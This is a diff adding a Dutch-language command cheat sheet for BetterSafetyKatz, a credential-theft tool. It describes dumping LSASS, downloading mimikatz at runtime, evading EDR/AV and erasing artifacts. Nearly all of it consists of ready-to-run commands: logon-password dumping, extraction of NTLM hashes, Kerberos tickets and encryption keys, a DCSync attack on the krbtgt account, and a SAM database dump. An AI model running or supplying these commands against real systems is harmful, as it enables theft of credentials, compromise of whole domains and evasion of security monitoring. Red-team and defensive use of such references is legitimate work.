@@ -1,0 +1,38 @@
+# BetterSafetyKatz — Verbeterde SafetyKatz met dynamische LSASS dump
+# Dumpt LSASS via dynamische methoden en parsed in-memory met mimikatz
+#
+# === Syntax ===
+# BetterSafetyKatz.exe [mimikatz-commando]
+#
+# === Verbeteringen t.o.v. SafetyKatz ===
+# - Dynamische LSASS dump methoden (niet altijd MiniDumpWriteDump)
+# - Download laatste mimikatz binary dynamisch
+# - Betere evasion van EDR/AV hooks
+# - Automatische opschoning van artifacts
+#
+# === Voorbeelden ===
+
+# Plaintext wachtwoorden en hashes dumpen
+BetterSafetyKatz.exe "sekurlsa::logonpasswords"
+
+# Alleen NTLM hashes
+BetterSafetyKatz.exe "sekurlsa::msv"
+
+# Kerberos tickets
+BetterSafetyKatz.exe "sekurlsa::tickets"
+
+# eKeys (AES/DES/RC4 sleutels)
+BetterSafetyKatz.exe "sekurlsa::ekeys"
+
+# DCSync aanval
+BetterSafetyKatz.exe "lsadump::dcsync /domain:DOMAIN /user:DOMAIN\krbtgt"
+
+# SAM database dumpen
+BetterSafetyKatz.exe "lsadump::sam"
+
+# Zonder argumenten — standaard logonpasswords
+BetterSafetyKatz.exe
+
+# NOTE: Vereist admin/SYSTEM rechten
+# NOTE: Heeft internet toegang nodig voor dynamische mimikatz download
+# NOTE: Betere evasion dan standaard SafetyKatz
